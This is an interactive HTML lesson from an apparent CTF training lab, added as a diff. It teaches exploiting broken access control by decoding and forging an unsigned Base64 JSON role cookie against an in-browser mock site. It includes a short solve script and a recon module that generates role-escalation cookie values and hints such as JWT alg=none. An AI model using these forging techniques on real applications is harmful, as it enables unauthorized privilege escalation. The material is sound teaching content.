@@ -1,0 +1,458 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Lesson 1 — From a Hand-Forged Cookie to a Typed Agent</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js"></script>
+<style>
+:root{color-scheme:dark;--bg:#0c0f14;--panel:#141a22;--panel2:#1a222c;--edge:#263040;
+--ink:#e6edf3;--mut:#8696a8;--accent:#f0883e;--accent2:#ffb15c;--ok:#46c66d;--bad:#ff6b57;
+--idor:#e59bff;--line:#2f3b4c;--mono:ui-monospace,Menlo,Consolas,monospace}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,system-ui,sans-serif;line-height:1.6}
+#progress{position:fixed;top:0;left:0;height:3px;background:var(--accent);width:0;z-index:50;transition:width .1s linear}
+#boot{position:fixed;top:10px;right:14px;z-index:50;font:11px/1 var(--mono);color:var(--mut);
+background:#0a0d12cc;border:1px solid var(--edge);border-radius:20px;padding:6px 11px;backdrop-filter:blur(6px)}
+#boot b{color:var(--accent2)}
+.wrap{max-width:860px;margin:0 auto;padding:0 20px}
+.hero{min-height:88vh;display:flex;flex-direction:column;justify-content:center;gap:16px}
+.kicker{font:700 12px/1 Inter;letter-spacing:2px;text-transform:uppercase;color:var(--accent)}
+h1{font-size:clamp(30px,5vw,52px);font-weight:800;line-height:1.08;margin:0;letter-spacing:-.02em}
+.lede{font-size:clamp(17px,2.4vw,21px);color:#c3d0dd;max-width:42ch}
+.sub{color:var(--mut);font-size:14px}
+section.scene{padding:9vh 0;border-top:1px solid #182029}
+.scene .step{opacity:0;transform:translateY(16px);transition:opacity .6s,transform .6s}
+.scene.in .step{opacity:1;transform:none}
+.scene .step:nth-child(2){transition-delay:.08s}.scene .step:nth-child(3){transition-delay:.16s}
+.scene .step:nth-child(4){transition-delay:.24s}
+.scenenum{font:700 12px/1 var(--mono);color:var(--accent);letter-spacing:1px}
+h2{font-size:clamp(23px,3.4vw,33px);font-weight:800;margin:.3em 0 .1em;letter-spacing:-.01em}
+.scene p{color:#c3d0dd}.scene p.small{color:var(--mut);font-size:14px}
+.card{background:var(--panel);border:1px solid var(--edge);border-radius:14px;padding:18px;margin:18px 0}
+.concept{border-left:3px solid var(--accent);background:#17130d;border-radius:0 12px 12px 0;padding:12px 16px;margin:16px 0}
+.concept b{color:var(--accent2)}
+.stage{background:#0a0d12;border:1px solid var(--edge);border-radius:14px;overflow:hidden;margin:18px 0}
+.stage .top{display:flex;align-items:center;gap:8px;padding:9px 13px;border-bottom:1px solid var(--edge);
+font:700 11px/1 var(--mono);color:var(--mut);letter-spacing:.5px;text-transform:uppercase}
+.stage .top .dot{width:8px;height:8px;border-radius:50%;background:#30404f}
+.stage .body{padding:14px}
+.btn{background:var(--accent);color:#1a1206;border:0;border-radius:9px;font:700 13px Inter;padding:9px 15px;
+cursor:pointer;margin:4px 6px 4px 0}
+.btn:hover{background:var(--accent2)}.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn.g{background:transparent;color:var(--ink);border:1px solid var(--edge)}
+.out{font:12.5px/1.6 var(--mono);white-space:pre-wrap;word-break:break-all;margin-top:10px;color:#cdd8e3}
+.out .k{color:var(--accent2)}.out .flag{color:var(--ok);font-weight:700}.out .mut{color:var(--mut)}
+.chip{display:inline-block;background:#1e2a3a;color:#9db4ff;font:700 10px var(--mono);padding:2px 8px;border-radius:20px}
+.chip.idor{background:#3a2140;color:var(--idor)}.chip.role{background:#3a2a16;color:var(--accent2)}
+.chip.sim{background:#3a2140;color:var(--idor);letter-spacing:.5px}
+pre.code{background:#0a0d12;border:1px solid var(--edge);border-radius:12px;padding:14px;overflow:auto;
+font:12.5px/1.6 var(--mono);color:#cdd8e3;margin:16px 0}
+pre.code .c{color:#5a6b7d}.code .s{color:#9ece9a}.code .kw{color:#c9a6ff}.code .fn{color:var(--accent2)}
+.cands{display:flex;flex-direction:column;gap:6px;margin-top:10px}
+.cand{display:flex;align-items:center;gap:10px;background:var(--panel);border:1px solid var(--edge);
+border-radius:9px;padding:8px 12px;font:12.5px var(--mono)}
+.cand .r{width:20px;height:20px;border-radius:50%;background:#2a3340;color:var(--mut);font:700 10px Inter;
+display:flex;align-items:center;justify-content:center;flex:none}
+.cand.top .r{background:var(--accent2);color:#1a1206}.cand.win{border-color:var(--ok);background:#13261a}
+.cand.win .r{background:var(--ok);color:#06210f}.cand .go{margin-left:auto;color:var(--mut);font-size:11px}
+.console{font:12.5px/1.7 var(--mono);background:#06080c;border-radius:10px;padding:12px;margin-top:10px;min-height:40px}
+.console .l .t{color:#4a5a6b}.c-fire{color:var(--accent)}.c-ok{color:var(--ok)}.c-no{color:var(--mut)}.c-plan{color:#c9a6ff}
+.ring{box-shadow:0 0 0 2px var(--accent2)}
+.map{position:relative;height:300px;background:#0a0d12;border:1px solid var(--edge);border-radius:14px;
+background-image:radial-gradient(rgba(255,255,255,.03) 1px,transparent 1px);background-size:9px 9px;overflow:hidden;margin:18px 0}
+.mn{position:absolute;background:var(--panel);border:1px solid var(--edge);border-radius:9px;padding:7px 10px;font:11px var(--mono);width:120px}
+.mn .h{font:700 10px Inter;color:var(--mut);margin-bottom:2px}
+.foot{padding:9vh 0 14vh;border-top:1px solid #182029;color:var(--mut)}
+.files{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0}
+.files a{font:12px var(--mono);color:var(--ink);background:var(--panel);border:1px solid var(--edge);
+border-radius:8px;padding:8px 12px;text-decoration:none}.files a:hover{border-color:var(--accent)}
+a{color:var(--accent2)}
+@media (prefers-reduced-motion: reduce){html{scroll-behavior:auto}*{transition:none!important}.scene .step{opacity:1;transform:none}}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+<div id="boot">Pyodide: <b id="bootstate">loading…</b></div>
+
+<div class="wrap">
+
+<header class="hero">
+  <div class="kicker">CTF Capability Lab · Lesson 1</div>
+  <h1>From a hand-forged cookie<br>to a typed agent.</h1>
+  <p class="lede">One small web challenge — <b>Broken Access Control</b> — solved five ways, each one a layer: by hand, by script, by recon, by map, by agent. The Python on this page is <b>real</b> and runs in your browser.</p>
+  <p class="sub">Scroll to advance. The deterministic code executes live (Pyodide + an in-page mock target). The LLM scenes are marked <span class="chip sim">SIMULATION</span> — they run with your own key in the repo's files.</p>
+</header>
+
+<!-- 1 -->
+<section class="scene" id="s1">
+  <div class="step"><div class="scenenum">SCENE 01 — THE TARGET</div>
+  <h2>You only see your own record</h2></div>
+  <div class="step"><p>A timekeeping app, "Pointeuse". It shows <i>your</i> hours and quietly resets overtime to zero. A note says only a <b>manager</b> may see the real team register. The app remembers who you are with one cookie — <code>profil</code>.</p></div>
+  <div class="step"><div class="card"><div class="small" style="color:var(--mut)">What the app sends you</div>
+  <div class="out"><span class="mut">Connecté : Vous (#8472) — profil <span class="k">employe</span></span><br>Heures sup. : 0h  <span class="mut">« politique d'entreprise »</span></div></div></div>
+  <div class="step"><p class="small">The whole challenge hides in that one word: <b>employe</b>. Where does it live, and who gets to change it?</p></div>
+</section>
+
+<!-- 2 -->
+<section class="scene" id="s2">
+  <div class="step"><div class="scenenum">SCENE 02 — SOLVE IT BY HAND</div>
+  <h2>The cookie is a trust token you can rewrite</h2></div>
+  <div class="step"><p>The <code>profil</code> cookie is a long string ending in <code>==</code>. That shape is <b>Base64</b> — an encoding, not encryption. Decode it and the app's trust decision is sitting there in plain text. Run it:</p></div>
+  <div class="step"><div class="stage"><div class="top"><span class="dot"></span>live · python in your browser</div>
+    <div class="body">
+      <button class="btn run" data-fn="decode">1 · decode()</button>
+      <button class="btn run g" data-fn="forge">2 · flip role → manager, forge</button>
+      <button class="btn run g" data-fn="fire">3 · fire at the dummy site</button>
+      <div class="out" id="out2"><span class="mut">Click 1 to decode the real cookie…</span></div>
+    </div></div></div>
+  <div class="step"><div class="concept"><b>Broken Access Control.</b> The server put a trust decision — your <code>role</code> — into data the browser fully controls, with <b>no signature</b>. A JWT would carry a cryptographic signature; this doesn't. So you rewrite <code>employe</code> → <code>manager</code>, re-encode, and the server believes you. It's #1 on the OWASP Top 10 for a reason.</div></div>
+  <div class="step"><p class="small">You just did the entire exploit by hand. Everything after this is about <i>not</i> doing it by hand.</p></div>
+</section>
+
+<!-- 3 -->
+<section class="scene" id="s3">
+  <div class="step"><div class="scenenum">SCENE 03 — LEVEL 0 · THE SCRIPT</div>
+  <h2>The oracle is the only thing allowed to say "it worked"</h2></div>
+  <div class="step"><p>Automating it is ten lines. But notice the last line — the <b>oracle</b>: a dumb, deterministic regex. It, and only it, decides success. That rule will matter enormously once an LLM enters the picture, because the LLM must never be the judge of its own success.</p></div>
+  <div class="step"><pre class="code"><span class="c"># solve.py — the exploit is hardcoded here (Level 0)</span>
+forged = base64.b64encode(<span class="s">b'{"employe":"...","role":"manager"}'</span>).decode()
+r = requests.get(TARGET, cookies={<span class="s">"profil"</span>: forged})
+
+<span class="c"># the ORACLE — the only judge of success</span>
+m = re.search(<span class="s">r"CyberZerk\{.*?\}"</span>, r.text)</pre></div>
+  <div class="step"><div class="concept">Three roles, kept apart: something <b>discovers</b>, something <b>executes</b>, something <b>verifies</b>. Here you are the discovery. Next we hand that part to code.</div></div>
+</section>
+
+<!-- 4 -->
+<section class="scene" id="s4">
+  <div class="step"><div class="scenenum">SCENE 04 — RECON · MAKE IT DYNAMIC</div>
+  <h2>Let the code find the lever itself</h2></div>
+  <div class="step"><p>Hardcoding one exploit is a demo, not a program. <code>recon.py</code> takes <i>any</i> cookie, detects how it's encoded, decodes it, and flags the fields that smell like <b>identity</b> or <b>role</b>. Run the real module:</p></div>
+  <div class="step"><div class="stage"><div class="top"><span class="dot"></span>live · recon.classify()</div>
+    <div class="body"><button class="btn run" data-fn="recon">recon.classify("profil", cookie)</button>
+      <div id="out4" class="out"><span class="mut">Click to decode and map the levers…</span></div>
+      <div class="cands" id="cands4"></div></div></div></div>
+  <div class="step"><div class="concept"><b>Deterministic recon finds shapes, not meaning.</b> It can tell you "there's a Base64-JSON cookie with a <code>role</code> key currently set to <code>employe</code>", and it pre-builds every escalation. What it <i>cannot</i> know is which one wins. That gap is exactly where an LLM earns its place.</div></div>
+</section>
+
+<!-- 5 -->
+<section class="scene" id="s5">
+  <div class="step"><div class="scenenum">SCENE 05 — REFRAME · THE MAP</div>
+  <h2>The same facts, seen as a surface</h2></div>
+  <div class="step"><p>A linear stepper implies one path and hides the alternatives. Drawn as a <b>map</b>, the whole attack surface is visible at once: one cookie forking into two lever-classes, the role lever fanning into concrete attempts. (This is the BloodHound lens — graph the relationships, don't list the records.)</p></div>
+  <div class="step"><div class="map" id="map5"></div></div>
+  <div class="step"><p class="small">Nothing new was discovered. The <i>view</i> changed — and a good view is most of what "a pain to use" actually means.</p></div>
+</section>
+
+<!-- 6 -->
+<section class="scene" id="s6">
+  <div class="step"><div class="scenenum">SCENE 06 — THE REASONING MODULE <span class="chip sim">SIMULATION</span></div>
+  <h2>An LLM as a typed module, not a magic agent</h2></div>
+  <div class="step"><p>Now fill the gap recon left: <i>which</i> lever to try first. The LLM does not run free — it's a module with a <b>typed contract</b>. It receives a scoped <b>projection</b> of state (<code>deps</code>) and may only return something that fits the <b>output contract</b> (<code>Rank | Ask | Answer</code>). Malformed output can't leak through.</p></div>
+  <div class="step"><pre class="code"><span class="kw">class</span> <span class="fn">Rank</span>(BaseModel):          <span class="c"># the CONTRACT</span>
+    pick: str
+    rationale: str
+
+brain = <span class="fn">Agent</span>(<span class="s">"mistral:…"</span>, output_type=Rank, deps_type=Projection)
+result = brain.run_sync(<span class="s">"rank the candidates"</span>, deps=projection)
+result.output.pick     <span class="c"># guaranteed a str — or we never got here</span></pre></div>
+  <div class="step"><div class="stage"><div class="top"><span class="dot" style="background:var(--idor)"></span>simulation · typed planner output</div>
+    <div class="body"><div class="out"><span class="mut">deps (projection) →</span> map + patterns<br><span class="mut">← output (validated)</span><br>
+    { <span class="k">"ranked"</span>: ["role=manager","role=admin","role=root", …],<br>
+    &nbsp;&nbsp;<span class="k">"rationale"</span>: "Unsigned Base64 role token — manager is the strongest escalation." }</div>
+    <p class="small" style="margin-top:10px">Marked simulation: a real Mistral key can't ship in a public page. Run it for real with <code>brain.py</code> / <code>recon_agent_v4.py</code> in this repo.</p></div></div></div>
+  <div class="step"><div class="concept"><b>Capabilities, not a persona.</b> Reasoning is one module among others — fuzzy on the inside, strict at the boundary. The type <i>is</i> the fence. (<a href="https://bridge-work.ai/en/blog/from-agents-to-ai-capabilities/" target="_blank">Less James Bond, more Ocean's Eleven.</a>)</div></div>
+</section>
+
+<!-- 7 -->
+<section class="scene" id="s7">
+  <div class="step"><div class="scenenum">SCENE 07 — THE AGENT · RANKED BATCH</div>
+  <h2>Semantic order, deterministic sweep</h2></div>
+  <div class="step"><p>Put it together: the menu is deterministic (<code>recon.py</code>), the <i>order</i> is the LLM's job, and the <b>oracle</b> still decides each hit. Fire them in ranked order, stop at the first flag. This part is real again — watch the console:</p></div>
+  <div class="step"><div class="stage"><div class="top"><span class="dot"></span>live · ranked batch vs. the dummy site</div>
+    <div class="body"><button class="btn run" data-fn="batch">▶ run ranked batch</button>
+      <div class="console" id="con7"><span class="mut">The sweep stops the moment the oracle sees a flag.</span></div></div></div></div>
+  <div class="step"><div class="concept"><b>LLM proposes, oracle disposes, deterministic code sweeps.</b> The probabilistic layer is boxed in on both sides — it can rank, but it cannot declare victory and cannot fire blindly.</div></div>
+</section>
+
+<!-- 8 -->
+<section class="scene" id="s8">
+  <div class="step"><div class="scenenum">SCENE 08 — THE SHAPE OF IT</div>
+  <h2>Three layers, each with a different trust property</h2></div>
+  <div class="step"><div class="card">
+    <div class="out"><span class="k">Data / Automation</span>  <span class="mut">recon.py</span>   — deterministic · decode, enumerate<br>
+    <span class="k">Reasoning</span>         <span class="mut">brain.py</span>   — probabilistic, <b>typed</b> · rank only<br>
+    <span class="k">Validation</span>        <span class="mut">oracle</span>     — deterministic · the <b>only</b> "it worked"</div></div></div>
+  <div class="step"><p>The probabilistic layer is fenced by deterministic layers on both sides. The LLM proposes; the oracle disposes; a human pulls the trigger. That's the whole design — and it scales far past one cookie.</p></div>
+  <div class="step"><div class="concept"><b>The honest limit.</b> The candidate wordlist in <code>recon.py</code> is still hardcoded. The intelligence only <i>re-orders</i> a fixed list — it doesn't yet <i>invent</i> values. Letting the planner generate its own candidates is Lesson 1's open edge.</div></div>
+  <div class="step"><p class="small">Not an intelligent little person with software attached — <b>probabilistic reasoning as one capability among others.</b></p></div>
+</section>
+
+<footer class="foot">
+  <div class="scenenum">THE REAL FILES</div>
+  <p class="small">Everything on this page is in the repo. The deterministic pieces ran here for real; the full agent (LLM + streaming console) runs with your own key.</p>
+  <div class="files">
+    <a href="solve.py">solve.py</a><a href="recon.py">recon.py</a><a href="brain.py">brain.py</a><a href="recon_agent_v4.py">recon_agent_v4.py</a>
+  </div>
+  <p class="small">CTF Capability Lab · Lesson 1 — Broken Access Control. More lessons, more topics, same arc: manual → agent.</p>
+</footer>
+
+</div>
+
+<script type="text/plain" id="src-recon">#!/usr/bin/env python3
+# recon.py — Trust-Token Recon fuer den Pointeuse-Solver.
+#
+# Nimmt Cookies und zerlegt sie in "Kandidaten-Hebel": welcher Wert traegt
+# Identitaet oder Rolle, wie ist er kodiert, und welche Mutation koennte
+# eskalieren. Deterministisch, stdlib only — das Fundament, auf dem spaeter
+# ein LLM (Level 1) die Kandidaten *interpretiert*.
+#
+# Standalone:   python3 recon.py
+# Import:       from recon import classify, recon_cookies
+
+import base64, json, binascii
+from urllib.parse import unquote
+
+# Keys die nach einer ROLLE riechen -> Eskalationswerte durchprobieren
+ROLE_KEYS = {"role", "roles", "admin", "is_admin", "isadmin", "type", "level",
+             "group", "groups", "perm", "perms", "permission", "permissions",
+             "scope", "scopes", "acl", "priv", "manager"}
+# Keys die nach IDENTITAET riechen -> IDOR-Kandidat (IDs durchzaehlen)
+ID_KEYS = {"id", "uid", "user", "username", "employe", "employee", "account"}
+# Typische Eskalationswerte fuer Rollen-Keys
+ESCALATE = ["manager", "admin", "administrator", "root", "superuser", "true", "1"]
+
+
+def _try_b64(s):
+    """Toleranter base64 / base64url Decode -> str oder None."""
+    t = s.replace("-", "+").replace("_", "/")
+    t += "=" * (-len(t) % 4)
+    try:
+        raw = base64.b64decode(t, validate=False)
+    except (binascii.Error, ValueError):
+        return None
+    try:
+        return raw.decode("utf-8")
+    except UnicodeDecodeError:
+        return None
+
+
+def _as_json(s):
+    try:
+        v = json.loads(s)
+        return v if isinstance(v, dict) else None
+    except (json.JSONDecodeError, TypeError):
+        return None
+
+
+def classify(name, value):
+    """Ein Cookie -> strukturierter Befund (encoding, decoded, json, hebel)."""
+    raw = unquote(value)  # %3D%3D -> ==
+    f = {"cookie": name, "encoding": "plain", "json": None, "levers": []}
+
+    # 1) JWT? drei base64url-Segmente mit Punkten
+    parts = raw.split(".")
+    if len(parts) == 3 and all(parts):
+        hdr, pl = _try_b64(parts[0]), _try_b64(parts[1])
+        if hdr and pl:
+            f["encoding"] = "jwt"
+            f["json"] = _as_json(pl)
+            _find_levers(f, f["json"], jwt=True)
+            return f
+
+    # 2) Base64(JSON)?
+    dec = _try_b64(raw)
+    if dec is not None:
+        j = _as_json(dec)
+        if j is not None:
+            f["encoding"] = "base64+json"
+            f["json"] = j
+            _find_levers(f, j)
+            return f
+        f["encoding"] = "base64"  # dekodiert, aber kein JSON
+        return f
+
+    # 3) Plain JSON?
+    j = _as_json(raw)
+    if j is not None:
+        f["encoding"] = "json"
+        f["json"] = j
+        _find_levers(f, j)
+    return f
+
+
+def _find_levers(f, obj, jwt=False):
+    """Markiere verdaechtige Keys und erzeuge fertige Mutationen."""
+    if not isinstance(obj, dict):
+        return
+    for k, v in obj.items():
+        kl = k.lower()
+        if kl in ROLE_KEYS:
+            muts = []
+            for cand in ESCALATE:
+                if str(v).lower() != cand:
+                    muts.append(_mutate(f, k, cand, jwt))
+            f["levers"].append({"typ": "rolle", "key": k, "aktuell": v,
+                                "mutationen": muts})
+        elif kl in ID_KEYS:
+            f["levers"].append({"typ": "identitaet", "key": k, "aktuell": v,
+                                "hinweis": "IDOR-Kandidat: ID durchzaehlen"})
+
+
+def _mutate(f, key, newval, jwt):
+    """key->newval, gleiche Kodierung. Fertiger Cookie-Wert oder Hinweis."""
+    j = dict(f["json"]); j[key] = newval
+    payload = json.dumps(j, separators=(",", ":"))
+    if jwt:
+        return {"set": f"{key}={newval}", "payload": payload,
+                "cookie_value": None,
+                "hinweis": "JWT: Signatur noetig (alg pruefen, evtl. alg=none)"}
+    if f["encoding"].startswith("base64"):
+        enc = base64.b64encode(payload.encode()).decode()
+    else:
+        enc = payload
+    return {"set": f"{key}={newval}", "payload": payload, "cookie_value": enc}
+
+
+def recon_cookies(cookies: dict):
+    """Mehrere Cookies -> Liste von Befunden mit Hebeln."""
+    return [classify(n, v) for n, v in cookies.items()]
+
+
+def report(findings):
+    """Lesbare Konsolen-Ausgabe der Kandidaten-Hebel."""
+    for f in findings:
+        print(f"\n■ Cookie '{f['cookie']}'  [{f['encoding']}]")
+        if f["json"] is not None:
+            print(f"  Inhalt: {json.dumps(f['json'], ensure_ascii=False)}")
+        if not f["levers"]:
+            print("  (kein verdaechtiger Hebel)")
+        for lv in f["levers"]:
+            if lv["typ"] == "identitaet":
+                print(f"  → [IDENTITAET] {lv['key']}={lv['aktuell']!r}  "
+                      f"— {lv['hinweis']}")
+            else:
+                print(f"  → [ROLLE] {lv['key']}={lv['aktuell']!r}  "
+                      f"— {len(lv['mutationen'])} Eskalationen vorbereitet:")
+                for m in lv["mutationen"][:3]:
+                    cv = m["cookie_value"] or m.get("hinweis", "")
+                    print(f"      {m['set']:<22} {cv[:48]}")
+
+
+if __name__ == "__main__":
+    # Demo auf dem echten profil-Cookie der Challenge
+    demo = {"profil": "eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D"}
+    report(recon_cookies(demo))
+</script>
+<script type="text/plain" id="src-lab">
+import base64, json, re
+LAB_FLAG = "CyberZerk{br0k3n_4ccess_c0ntr0l_101}"   # lab flag — NOT the live-CTF flag
+def _b64(s): return base64.b64encode(s.encode()).decode()
+def _ub64(s):
+    t = s.replace('-','+').replace('_','/'); t += '=' * (-len(t) % 4)
+    return base64.b64decode(t)
+def forge(role):
+    return _b64(json.dumps({"employe":"Vous (#8472)","role":role}, separators=(',',':')))
+EMPLOYE_COOKIE = forge("employe")
+def decode(cookie):
+    return json.loads(_ub64(cookie))
+def mock_pointeuse(profil):          # the DUMMY SITE: vulnerably trusts the cookie's role
+    try: role = decode(profil).get("role","employe")
+    except Exception: role = "employe"
+    if role in ("manager","admin","administrator","root","superuser"):
+        return "<h1>REGISTRE REEL</h1><p>Team — real overtime…</p><p>FLAG: " + LAB_FLAG + "</p>"
+    return "<h1>Votre fiche</h1><p>Heures sup: 0h</p>"
+def oracle(html):
+    m = re.search(r"CyberZerk\{.*?\}", html); return m.group() if m else None
+</script>
+
+<script>
+const $=s=>document.querySelector(s), $$=s=>[...document.querySelectorAll(s)];
+let py=null;
+async function boot(){
+  try{
+    py=await loadPyodide();
+    py.runPython($('#src-lab').textContent);
+    py.runPython($('#src-recon').textContent);
+    $('#bootstate').textContent='ready';$('#bootstate').style.color='var(--ok)';
+    $$('.btn.run').forEach(b=>b.disabled=false);
+  }catch(e){$('#bootstate').textContent='failed';$('#bootstate').style.color='var(--bad)';console.error(e);}
+}
+$$('.btn.run').forEach(b=>b.disabled=true);
+boot();
+
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;');}
+const P=o=>JSON.parse(py.runPython(o));   // run python, parse json result
+
+const FN={
+  decode(){
+    const d=P("json.dumps(decode(EMPLOYE_COOKIE))");
+    $('#out2').innerHTML='decode(profil) → '+JSON.stringify(d).replace('"employe":"employe"','')
+      .replace('"role":"employe"','<span class="k">"role":"employe"</span>')+
+      '<br><span class="mut">the trust decision, in plain text ↑</span>';
+  },
+  forge(){
+    const f=py.runPython("forge('manager')");
+    $('#out2').innerHTML+='<br><br>forge(role=<span class="k">manager</span>) → <br>'+esc(f)+
+      '<br><span class="mut">same structure, one word changed, re-encoded ↑</span>';
+  },
+  fire(){
+    const html=py.runPython("mock_pointeuse(forge('manager'))");
+    const flag=py.runPython("oracle(mock_pointeuse(forge('manager')))");
+    $('#out2').innerHTML+='<br><br><span class="mut">GET / with forged cookie → the dummy site returns:</span><br>'+
+      esc(html.replace(/<[^>]+>/g,' ')).trim()+
+      (flag?'<br><span class="flag">▶ '+flag+'</span>':'');
+  },
+  recon(){
+    const f=P('import json\njson.dumps(classify("profil", EMPLOYE_COOKIE))');
+    $('#out4').innerHTML='encoding: <span class="k">'+f.encoding+'</span> · content: '+esc(JSON.stringify(f.json));
+    const box=$('#cands4');box.innerHTML='';
+    f.levers.forEach(lv=>{
+      if(lv.typ==='identitaet'){const d=document.createElement('div');d.className='cand';
+        d.innerHTML='<span class="chip idor">IDOR</span> '+lv.key+'='+lv.aktuell+'<span class="go">'+lv.hinweis+'</span>';box.appendChild(d);}
+      else{lv.mutationen.filter(m=>m.cookie_value).forEach((m,i)=>{const d=document.createElement('div');
+        d.className='cand';d.innerHTML='<span class="r">·</span><span>'+m.set+'</span><span class="go">prepared</span>';box.appendChild(d);});}
+    });
+  },
+  batch(){
+    const r=P(`
+_f = classify("profil", EMPLOYE_COOKIE)
+_c = [(m["set"], m["cookie_value"]) for lv in _f["levers"] if lv["typ"]=="rolle" for m in lv["mutationen"] if m["cookie_value"]]
+_log=[]; _flag=None
+for s,cv in _c:
+    h=mock_pointeuse(cv); fl=oracle(h)
+    _log.append({"set":s,"flag":fl})
+    if fl: _flag=fl; break
+json.dumps({"log":_log,"flag":_flag,"ranked":[s for s,_ in _c]})`);
+    const con=$('#con7');con.innerHTML='';let i=0;
+    const line=(cls,t)=>{const d=document.createElement('div');d.className='l '+cls;
+      d.innerHTML='<span class="t">'+new Date().toLocaleTimeString()+'</span>  '+t;con.appendChild(d);};
+    line('c-plan','plan · '+r.ranked.join(' > ')+'  (deterministic order here; LLM-ranked in the real agent)');
+    const step=()=>{
+      if(i>=r.log.length){line('c-ok','done · flag after '+r.log.length+' attempt(s)');return;}
+      const e=r.log[i];line('c-fire','fire · '+e.set+' →');
+      setTimeout(()=>{ if(e.flag){line('c-ok','oracle · '+e.set+' · FLAG ✓ '+e.flag);}
+        else{line('c-no','oracle · '+e.set+' · no flag');i++;setTimeout(step,260);} },260);
+    };setTimeout(step,300);
+  }
+};
+document.addEventListener('click',e=>{const b=e.target.closest('.btn.run');if(!b||b.disabled)return;
+  try{FN[b.dataset.fn]();}catch(err){console.error(err);}});
+
+// scene reveal + progress
+const io=new IntersectionObserver(es=>es.forEach(x=>{if(x.isIntersecting)x.target.classList.add('in');}),{threshold:.18});
+$$('section.scene').forEach(s=>io.observe(s));
+addEventListener('scroll',()=>{const h=document.documentElement;
+  $('#progress').style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight)*100)+'%';},{passive:true});
+
+// scene 5 — static map
+const M=$('#map5');[['Ziel','12','120'],['Cookie · base64+json','150','120'],
+  ['Identity · IDOR','320','40'],['Role · 7×','320','190'],['role=manager','560','40'],['role=admin','560','120'],['role=…','560','200']]
+  .forEach(([t,x,y])=>{const n=document.createElement('div');n.className='mn';n.style.left=x+'px';n.style.top=y+'px';
+    n.innerHTML='<div class="h">'+t.split(' · ')[0]+'</div>'+(t.includes('·')?'<span class="mut">'+t.split(' · ')[1]+'</span>':'');M.appendChild(n);});
+</script>
+</body>
+</html>
